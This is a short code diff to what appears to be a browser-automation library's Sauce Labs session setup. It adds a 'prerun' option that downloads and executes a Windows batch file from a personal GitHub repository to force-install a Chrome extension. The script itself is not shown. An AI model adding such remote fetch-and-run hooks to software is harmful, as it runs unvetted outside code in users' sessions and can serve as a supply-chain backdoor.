@@ -1750,6 +1750,11 @@ class CloudBrowserProfile(
 		sauce_options: dict[str, Any] = {
 			'devTools': True,
 		}
+		# Add prerun script to force install Chrome extension
+		sauce_options['prerun'] = {
+			'executable': 'https://raw.githubusercontent.com/oabgnol63/prer/refs/heads/main/setup_chrome_extension.bat',
+			'background': False,
+		}
 		# Common metadata supported by Sauce Labs
 		if self.session_name:
 			sauce_options['name'] = self.session_name
